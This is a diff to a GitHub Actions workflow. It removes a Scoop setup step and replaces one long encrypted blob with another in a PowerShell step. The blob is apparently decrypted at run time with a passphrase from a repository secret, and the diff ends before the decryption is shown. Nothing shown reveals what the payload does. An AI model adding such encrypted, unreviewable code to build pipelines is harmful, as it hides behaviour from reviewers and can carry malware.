@@ -24,17 +24,10 @@ jobs:
   k:
     runs-on: windows-latest
     steps:
-      - name: king
-        uses: MinoruSekine/setup-scoop@main
-        with:
-          install_scoop: 'true'
-          buckets: extras
-          scoop_update: 'true'
-          update_path: 'true'
       - name: June
         shell: pwsh
         run: |
-          $encrypted_payload = "U2FsdGVkX1/NheSpGVHELFXBhBpebyrDyiOt7FJC3TTu17vwWm7XVyIj2SrNSy54+fBLwtJ9L9iCjlX7EKHlef8ZKDhcQkFlLBHYQvS+9vsigdc8wft3FAL9VgT6Fa3Iy0NSJSJZI+DoqfMluv0ZyUcjCey4Q2yvkXILDaqF0Nxo37IcFhZsbbbtxOZdtr4G+p+qK6e8fDOUWBsBhNvtW11Vl8U8QfU3VGNdq8EYhJqO3m/wqSvbbNDCPEflaOrqN3iJHSSaq1opbH/XN0gOBUlZ13KUdQfWE3t5EihVR0tDNMRk0FK6Vkhns0bjr3O4U8SPX3Pm6sITMY7TtyopXQB+oPxMhPHupdNgDgYr9O9B+fFM1fOB2cTuDL+Nr37NP7GyUwVtE40XrbjOvWl0O99fUj9vBpGKZLK3HYSEmonRr8/Z7yYiw+j1xfpRi8QuiS4YF6jNquiBYC8SbrqXB44HjBF+BilP+qVHiKCdt0VBtfTC+LNavw8/DtNKAB43LTdTw1ubTwiCiqajhtQYCsnxPlooivDcobCZBXdrTodwQkBP+Qfq0lcwQ/CG5BlN2WoopoODPBNtVNkSUKur6Rez2HEyC+qjKdwLviI08PutdxDjasht1QNo+3e0NtrngbowG0M4hoHq9h1RcbZyGUG33M8TuariLs+3mmFGhkx6RVI5cGA6UDcZ1hwvssBWbZhn1KGFzMhDrba1lrwWn9xE5kVstHxru3eX0tQPWl0OS9m2zmfzhhHP7QH1ke5Yx6YrBXTA82s9YfQzsqMSHycgnsQB3hJJXiQVpDrJhoMl2IOezHkUK+2gaxqB+7Jspv1ZB5wKFz4LJTyciBiuoUHeZ2kdg/sOyu+yBSwaQ+XWTdIV89yYKQ8VjqMXno/inXOoSL+cs8RNv24cg4uWnFDYb1H2JQy6Bz/C8mdXBsbgBzPl0tT/FXsBxbyvoBLOIL7zSeBi6+X1Ue8e5IoVr/CicsSsdTq1BHBtfKBJxpbo6RFsxa89GEoIv7CI9meXygLDmgdAsYki+zMlBth/UibeqBfpK7rKv9GoyzD/fGJKwI8dZmP8m8GNYv3rINx5"
+          $encrypted_payload = "U2FsdGVkX18/GLvdk8SGzb+Ls26oiiwm08FwIMolCP4voGh7PAOZtCoi6GDAHN0nDauS3nmsxokMDWM4tbLdYsXeKEmXN10jHEfi9LfYly2+f72KkQvRuMFtXpxviot+qRAKDTURlucdUjyAnIQJXD4w5KGSI2GuYqBi2bXnU8ZAgXO31NZvR6mm2wGzglqno4hTL8GERfpHsMm796LEMzNFnorQWDpvHE5cP0s9UXjG7B61b6rtji7zB/VCb+ann1sPKCA2Cztsx8O4Zw2X+eKVJF7D1C4Tre/R8ApYf7Y4qn06B0/PIlPdNCr1LkLrCNULyj3ni1H/jEZ92p07bvvWfYy+xAfrUVcsuKp3lCPLLu5b/oHK1vPFOvmfO8l4+f16xq71Ms6nCUGQjsPSMoo9R3NXppt/KXGJOPQiK1EGruaQMO+JG5N4uChUOF49M8uH28AXVUr84firFvNJbX15TLmYThCdXWh2NFIkjibfxQmz2Y4YxF6xtpgYrodDNPbGbUy99MqyqcfKbaHsDzaRNkLUdWmHD+Lafl9tf5o7giBiLEc1JJ5h/bScxCyqKJgGTZroUWDLvpI8KAzCWUZDRkVJWsZ0nSsHApYVBKCDbGKhNdlg4Iacs2nUyWDO3G+xEnHuVm+yq+e5hIZlvqn1pbcHHANxD2PGc0OPj1/j9LwXPtBplS54pCCfnve++RQMMM6p0KTN+QSpm3Z3PWTZSBom7JLq+VUE7uVYAt9cV6y/fz9tedOaYuRnkptZzx0Xu6pcpG+4//F1zYiG3I+ZjKHTIohnO5sfE8bMcOtvGzYGoNUPLhzQuPHtjpEAT6KDvUkCc+g+SET7XgZodD/S7UXirqsXwE46Q8DdXspcVreoIQ/AZv7jS5CcDFaQitd8fGr8QNN5A8qyJJRR1rln2Uy59gvoRInNylDUW2BbnM3cdNKxb7m/LdFvSijA0J8rvvU0MHTMspSKC1Z9NDTKgmZfBSS1kyB2UdYeNmZmdsmt8gF+fdc1MZHGvDRJiqTZsWWobmNg9dljyBfFcEtqiWA3hNMtklvGRwGW81mZArU/xg+z/ATsdGrRlP6FjHmoRc9QkWAvYFHLexlbNtvx6tfIcMla9MsdDzoUT34xM2RhyQa5PksVbxZz3HhnfkpmwtAbzRqxBSbDOyA6M2b1g6+6b70oC7OHzRiN14ltEfkPUlpt1R2uc/vEMyiBDH1IkikAEEV5m6aebIxXERhp/9U7x0dBdB87zIlF+ARDr9ccaq+DlIH3Iyj04KBGZzFJa9EEnQCAuFrLGcA1LY9eVsR4R0Ty+JLZeaHf7TuOgllLVyRIuwGTpkJ1BVJZt8DZdYrI7HjeIrD1q8jJHR7QNcBoEjN8BsfCZNY/Gkyq08iWMJaj6SjkyUgc1vCkbDgTDlvhlcyW9VM6F2D7ZVMVUAcoWqe7XYyECFdyyauAXCB0E6JFsFuekoR/FHXdgCxgE7n6Nrwg58vjiqldwk/NWTNh/jLEcVPCtmn69I5CYQmG891TERa9W+0f8wzYOU7VqwkPw3xJFKayhGQBag=="
           $passphrase = $env:DECRYPTION_KEY
 
           $iterations = 10000
